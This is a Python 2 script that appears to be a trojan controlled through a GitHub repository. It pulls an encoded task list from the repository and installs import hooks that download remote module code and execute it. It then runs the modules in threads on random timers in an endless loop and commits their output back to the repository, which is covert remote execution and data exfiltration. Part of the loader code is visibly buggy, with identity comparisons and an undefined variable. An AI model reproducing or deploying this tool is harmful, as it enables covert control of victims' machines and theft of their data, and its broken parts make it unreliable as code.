# -*- coding: utf-8 -*-
# @Author: test
# @Date:   2017-01-19 12:53:02
# @Last Modified by:   test
# @Last Modified time: 2017-01-19 14:02:54
import json
import base64
import sys
import time
import imp
import marshal
import random
import threading
import Queue
import os

from github3 import login

_id = 'abc'

_config = '%s.json' % _id
data_path = 'data/%s/' % _id
_modules = []
configured = False
task_queue = Queue.Queue()


def connect_github():
    gh = login(username='username', password='password')
    if not gh:
        raise Exception()
    print gh.user()
    repo = gh.repository('username', 'toy')
    print repo
    branch = repo.branch('master')

    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print '[*] Found file %s' % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


def get_config():
    global configured
    config_json = get_file_contents(_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])

    return config


def store_module_result(data):
    gh, repo, branch = connect_github()
    remote_path = 'data/%s/%d.data' % (_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "commit message", base64.b64encode(data))

    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''

    def find_module(self, fullname, path=None):
        if configured:
            print '[*] Attempting to retrieve %s' % fullname
            fullname = fullname.replace('.', '/')
            new_library = get_file_contents('modules/%s' % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):
        print name
        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module


gmodules = {}
gh_package = True


class GHLoader(object):

    def __init__(self, fullname, contents, ext, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.ext = ext
        self.is_pkg = is_pkg
        self.path = path
        self.archive = ''

    def load_module(self, fullname):
        imp.acquire_lock()
        try:
            if fullname is sys.modules:
                return sys.modules[fullname]
            mod = None
            c = None
            if self.ext is 'py':
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'GH://{}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/', 1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                code = compile(self.contents, mod.__file__, 'exec')
                exec(code, mod.__dict__)

            elif self.ext in ('pyc', 'pyo'):
                mod = imp.new_module(fullname)
                mod.__name__ = fullname
                mod.__file__ = 'GH://{}'.format(self.path)
                if self.is_pkg:
                    mod.__path__ = [mod.__file__.rsplit('/', 1)[0]]
                    mod.__package__ = fullname
                else:
                    mod.__package__ = fullname.rsplit('.', 1)[0]
                sys.modules[fullname] = mod
                exec(marshal.loads(self.contents[8:]), mod.__dict__)
            # elif self.ext in ('dll', 'pyd', 'so'):
            #     init_name = 'init' + fullname.rsplit('.', 1)[-1]
            #     path = self.fullname.rsplit('.', 1)[0].replace('.', '/') + '.' + self.ext
            #     mod =
        except Exception:
            if fullname in sys.modules:
                del sys.modules[fullname]
        finally:
            self.contents = None
            imp.release_lock()
        return sys.modules[fullname]


class GHImportErr(ImportError):
    pass


class GHFinder(object):
    search_lock = None
    search_set = set()

    def __init__(self, path=None):
        if path and not path.startswith('GH://'):
            raise GHImportErr()

    def find_module(self, fullname, path=None, second=False):
        global gmodules
        global gh_package

        print fullname
        print path

        def get_module_files(fullname):
            """ return the file to load """

            path = fullname.replace('.', '/')

            files = [
                module for module in gmodules.iterkeys() \
                if module.rsplit(".", 1)[0] == path or any([
                    path + '/__init__' + ext == module for ext in [
                        '.py', '.pyc', '.pyo'
                    ]
                ])
            ]

            if len(files) > 1:
                # If we have more than one file, than throw away dlls
                files = [x for x in files if not x.endswith('.dll')]

            return files
        imp.acquire_lock()
        selected = None
        try:
            files = get_module_files(fullname)
            ghfiles = [
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in [
                        '.pyo', '.pyc', '.py'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyo', '.pyc'
                    ]
                ]),
                lambda f: any ([
                    f.endswith(ext) for ext in [
                        '.pyd', '.py', '.so', '.dll'
                    ]
                ]),
            ]

            selected = None
            for gh in ghfiles:
                for pyfile in files:
                    if gh(pyfile) and pyfile in modules:
                        selected = pyfile
                        break

            if not selected:
                return None

            content = modules[selected]
            ext = selected.rsplit('.', 1)[1].strip().lower()
            is_pkg = any([
                selected.endswith('/__init__' + ex) for ex in ['.pyo', '.pyc', '.py']
            ])

            return GHLoader(fullname, content, ext, is_pkg, selected)

        except Exception as e:
            raise e

        finally:
            del gmodules[selected]
            imp.release_lock()


sys.meta_path = [GitImporter()]
sys.path_hooks.append(GHFinder)
sys.path.append('GH://')
# sys.path.append('gh://')

sys.path_hooks.append(GitImporter())
sys.path.append('GH://')
# sys.path.append('gh://')
# sys.meta_path = [GitImporter()]


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)

    return


while True:
    if task_queue.empty():
        config = get_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))
